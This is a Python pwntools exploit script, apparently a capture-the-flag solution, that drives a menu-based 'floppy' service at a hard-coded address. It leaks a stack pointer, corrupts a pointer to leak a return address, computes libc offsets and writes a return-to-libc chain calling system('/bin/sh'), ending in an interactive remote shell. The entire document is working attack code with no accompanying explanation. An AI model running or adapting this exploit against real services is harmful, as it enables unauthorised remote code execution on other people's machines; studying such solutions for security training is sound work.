#!/usr/bin/python
from pwn import *
import socket
import struct

c = socket.create_connection(('175.119.158.134', 5559))
r = remote.fromsocket(c)

r.recvuntil('5. Exit')
c.send('1\n')
r.recvuntil('Which floppy')
c.send('1\n')

r.recvuntil('5. Exit')
c.send('2\n')
r.recvuntil('Input your data:')
c.send('a\n')
r.recvuntil('Description')
c.send('a\n')

r.recvuntil('5. Exit')
c.send('4\n')
r.recvuntil('Which one')
c.send('1\n')
r.recvuntil('Input')
c.send('A' * 16 + '\n')

r.recvuntil('5. Exit')
c.send('3\n')
r.recvuntil('DESCRIPTION: ')
desc = r.recvn(16 + 8)

sptr = struct.unpack('<I', desc[20:24])[0]
retptr = sptr - 0x04

r.recvuntil('5. Exit')
c.send('1\n')
r.recvuntil('Which floppy')
c.send('2\n')

r.recvuntil('5. Exit')
c.send('2\n')
r.recvuntil('Input your data:')
c.send('a\n')
r.recvuntil('Description')
c.send('a\n')

r.recvuntil('5. Exit')
c.send('4\n')
r.recvuntil('Which one')
c.send('1\n')
r.recvuntil('Input')
c.send('A' * 20 + struct.pack('<I', retptr) + '\n')

r.recvuntil('5. Exit')
c.send('1\n')
r.recvuntil('Which floppy')
c.send('1\n')

r.recvuntil('5. Exit')
c.send('3\n')
r.recvuntil('DATA: ')
data = r.recvn(4)
retaddr = struct.unpack('<I', data)
print hex(retaddr)

libc_base = retaddr - 0x1872E
system = libc_base + 0x3ACF0
binsh = libc_base + 0x15c8db

r.recvuntil('5. Exit')
c.send('4\n')
r.recvuntil('Which one')
c.send('2\n')
r.recvuntil('Input')
c.send(struct.pack('<III', system, libc_base + 0x2ec90, binsh) + '\n')

r.recvuntil('5. Exit')
c.send('3\n')
r.recvuntil('DATA: ')
data = r.recvn(12)
print [hex(x) for x in struct.unpack('<III', data)]

c.send('5\n')
r.interactive()
